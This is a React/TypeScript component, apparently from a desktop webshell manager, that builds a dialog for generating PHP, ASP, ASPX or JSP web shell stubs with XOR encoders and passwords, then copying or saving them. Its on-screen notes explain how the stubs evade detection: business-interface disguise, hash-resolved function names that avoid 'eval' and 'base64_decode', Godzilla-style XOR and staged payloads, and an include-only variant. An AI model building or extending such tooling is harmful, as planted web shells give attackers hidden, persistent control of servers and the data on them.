import { useEffect, useState } from "react";
import { Copy, LoaderCircle, Save } from "lucide-react";
import { save } from "@tauri-apps/plugin-dialog";
import { api, b64, errorText } from "../api";
import type { GenerateShellResult } from "../api";
import { Dialog } from "../components/Dialog";

const LANGUAGES: { value: string; label: string }[] = [
  { value: "php", label: "PHP" },
  { value: "asp", label: "ASP (VBScript)" },
  { value: "aspx", label: "ASP.NET (C#)" },
  { value: "jsp", label: "JSP" },
];

/**
 * 生成 Webshell：选择语言 × 编码器 × 密码，生成服务端 stub 并可保存。
 * 生成的 stub 与对应语言的连接协议配套使用（当前连接协议仅 PHP 可用）。
 */
export function GenerateShellDialog({
  onClose,
}: {
  onClose: () => void;
}) {
  const [language, setLanguage] = useState("php");
  const [encoders, setEncoders] = useState<[string, string][]>([]);
  const [encoderId, setEncoderId] = useState("xor_base64");
  const [password, setPassword] = useState("");
  const [session, setSession] = useState(false);
  const [result, setResult] = useState<GenerateShellResult | null>(null);
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState("");
  const [copied, setCopied] = useState(false);

  useEffect(() => {
    void api.listEncoders().then(setEncoders).catch(() => {});
  }, []);

  async function generate() {
    if (!password.trim()) {
      setError("请填写连接密码（用于派生 XOR 密钥，服务端 stub 不保存明文密码）");
      return;
    }
    setBusy(true);
    setError("");
    setCopied(false);
    try {
      setResult(await api.generateShell(language, encoderId, password, session));
    } catch (cause) {
      setError(errorText(cause));
    } finally {
      setBusy(false);
    }
  }

  async function saveFile() {
    if (!result) return;
    const localPath = await save({ defaultPath: result.filename });
    if (!localPath) return;
    try {
      await api.writeLocalFile(localPath, b64.encodeText(result.content));
    } catch (cause) {
      setError(`保存失败：${errorText(cause)}`);
    }
  }

  async function copyContent() {
    if (!result) return;
    try {
      await navigator.clipboard.writeText(result.content);
      setCopied(true);
    } catch {
      setError("复制失败");
    }
  }

  return (
    <Dialog title="生成 Webshell" onClose={onClose}>
      <div className="generate-form">
        {error && <p className="form-note error">{error}</p>}
        <label>
          语言
          <select value={language} onChange={(event) => setLanguage(event.target.value)}>
            {LANGUAGES.map((item) => (
              <option key={item.value} value={item.value}>
                {item.label}
              </option>
            ))}
          </select>
        </label>
        <label>
          编码方式
          <select value={encoderId} onChange={(event) => setEncoderId(event.target.value)}>
            {encoders.map(([id, displayName]) => (
              <option key={id} value={id}>
                {displayName}
              </option>
            ))}
          </select>
        </label>
        <label>
          连接密码
          <input
            type="password"
            value={password}
            onChange={(event) => setPassword(event.target.value)}
            placeholder="用于派生 XOR 密钥（md5）"
          />
        </label>
        <label className="confirm-row">
          <input
            type="checkbox"
            checked={session}
            onChange={(event) => setSession(event.target.checked)}
          />
          <span>分阶段会话模式（Godzilla 风格：代码一次注入，之后仅传参数）</span>
        </label>
        <button className="button primary" onClick={() => void generate()} disabled={busy}>
          {busy ? <LoaderCircle className="spin" size={15} /> : null}
          {busy ? "生成中…" : "生成"}
        </button>

        {result && (
          <div className="generate-result">
            <div className="generate-result-head">
              <code>{result.filename}</code>
              <span>
                <button className="button compact" onClick={() => void copyContent()}>
                  <Copy size={13} />
                  {copied ? "已复制" : "复制"}
                </button>
                <button className="button compact" onClick={() => void saveFile()}>
                  <Save size={13} />
                  保存文件
                </button>
              </span>
            </div>
            <pre>{result.content}</pre>
            <p className="form-note">
              部署到授权目标后，创建对应语言的 Shell 并选择相同编码方式与密码即可连接。
              当前连接协议仅 PHP 可用，ASP / ASPX / JSP 的客户端协议规划中。
            </p>
            <p className="form-note">
              OPSEC：PHP stub 已做业务伪装（形如业务接口，敏感函数经 crc32b
              哈希查表解析，无小写 eval(/base64_decode( 等敏感词）；
              XOR_BODY / XOR_SESSION 为请求体 XOR 直传（Godzilla 风格），默认配置
              可用（XOR_SESSION 采用分阶段载荷：代码只传一次，之后仅传参数）；
              PHP_STREAM 为一行 INCLUDE stub（零敏感函数），需 allow_url_include=On。
            </p>
          </div>
        )}
      </div>
    </Dialog>
  );
}
